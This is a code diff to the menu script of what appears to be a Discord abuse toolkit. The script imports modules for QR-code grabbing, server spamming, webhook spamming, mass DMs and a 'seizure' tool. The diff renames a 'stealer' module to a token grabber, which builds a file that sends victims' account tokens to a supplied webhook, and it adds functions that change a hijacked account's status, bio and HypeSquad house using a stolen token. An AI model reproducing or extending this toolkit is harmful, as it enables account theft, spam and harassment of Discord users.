@@ -24,9 +24,9 @@ import util.QR_Grabber
 import util.seizure
 import util.server_leaver
 import util.spamservers
-import util.statuschanger
+import util.profilechanger
 import util.friend_blocker
-import util.create_stealer_V2
+import util.create_token_grabber
 import util.unfriender
 import util.webhookspammer
 import util.massdm
@@ -260,22 +260,38 @@ def main():
                         ''')
         secondchoice = input(
             f'{Fore.GREEN}[{Fore.CYAN}>>>{Fore.GREEN}] {Fore.RESET}Setting: {Fore.RED}')
-        if secondchoice not in ["1", "2", "3", "4"]:
+        if secondchoice not in ["1", "2", "3"]:
             print(f'{Fore.RESET}[{Fore.RED}Error{Fore.RESET}] : Invalid choice')
             sleep(1)
             main()
         if secondchoice == "1":
-            Status = str(input(
-                f'{Fore.GREEN}[{Fore.CYAN}>>>{Fore.GREEN}] {Fore.RESET}Custom Status: {Fore.RED}'))
-            util.statuschanger.StatusChanger(token, Status)
+            status = input(
+                f'{Fore.GREEN}[{Fore.CYAN}>>>{Fore.GREEN}] {Fore.RESET}Custom Status: {Fore.RED}')
+            util.profilechanger.StatusChanger(token, status)
+
         if secondchoice == "2":
-            print("not finished")
-            sleep(1.5)
-            main()
+            bio = input(
+                f'{Fore.GREEN}[{Fore.CYAN}>>>{Fore.GREEN}] {Fore.RESET}Custom bio: {Fore.RED}')
+            util.profilechanger.BioChanger(token, bio)
+
         if secondchoice == "3":
-            print("not finished")
-            sleep(1.5)
-            main()
+            print(f'''
+{Fore.RESET}[{Fore.MAGENTA}1{Fore.RESET}]{Fore.MAGENTA} HypeSquad Bravery
+{Fore.RESET}[{Fore.RED}2{Fore.RESET}]{Fore.LIGHTRED_EX} HypeSquad Brilliance
+{Fore.RESET}[{Fore.LIGHTGREEN_EX}3{Fore.RESET}]{Fore.LIGHTGREEN_EX} HypeSquad Balance
+                        ''')
+            thirdchoice = input(
+                f'{Fore.GREEN}[{Fore.CYAN}>>>{Fore.GREEN}] {Fore.RESET}Hypesquad: {Fore.RED}')
+            if thirdchoice not in ["1", "2", "3"]:
+                print(f'{Fore.RESET}[{Fore.RED}Error{Fore.RESET}] : Invalid choice')
+                sleep(1)
+                main()
+            if thirdchoice == "1":
+                util.profilechanger.HouseChanger(token, 1)
+            if thirdchoice == "2":
+                util.profilechanger.HouseChanger(token, 2)
+            if thirdchoice == "3":
+                util.profilechanger.HouseChanger(token, 3)
 
 
     elif choice == '12':
@@ -290,7 +306,7 @@ def main():
         validateWebhook(WebHook)
         fileName = str(input(
             f'{Fore.GREEN}[{Fore.CYAN}>>>{Fore.GREEN}] {Fore.RESET}File name: {Fore.RED}'))
-        util.create_stealer_V2.TokenGrabberV2(WebHook, fileName)
+        util.create_token_grabber.TokenGrabberV2(WebHook, fileName)
 
 
     elif choice == '14':
